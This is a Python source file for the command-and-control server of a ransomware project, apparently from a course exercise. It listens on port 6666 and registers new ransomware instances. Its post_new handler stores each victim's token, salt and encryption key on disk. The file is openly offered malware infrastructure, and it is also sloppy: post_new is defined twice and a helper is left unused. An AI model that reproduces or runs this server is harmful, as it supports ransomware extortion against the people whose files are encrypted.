import base64
from hashlib import sha256
from http.server import HTTPServer
import os

from cncbase import CNCBase

class CNC(CNCBase):
    ROOT_PATH = "/root/CNC"

    def save_b64(self, token:str, data:str, filename:str):
        # helper
        # token and data are base64 field

        bin_data = base64.b64decode(data)
        path = os.path.join(CNC.ROOT_PATH, token, filename)
        with open(path, "wb") as f:
            f.write(bin_data)

    def post_new(self, path:str, params:dict, body:dict)->dict:
        # used to register new ransomware instance
        return {"status":"KO"}
    def post_new(self, path: str, params: dict, body: dict) -> dict:
        token = base64.b64decode(body["token"])
        salt = base64.b64decode(body["salt"])
        key = base64.b64decode(body["key"])

        directory = os.path.join("tokens", token.hex())
        os.makedirs(directory, exist_ok=True)

        with open(os.path.join(directory, "salt"), "wb") as salt_file:
            salt_file.write(salt)

        with open(os.path.join(directory, "key"), "wb") as key_file:
            key_file.write(key)

        return {}

           
httpd = HTTPServer(('0.0.0.0', 6666), CNC)
httpd.serve_forever()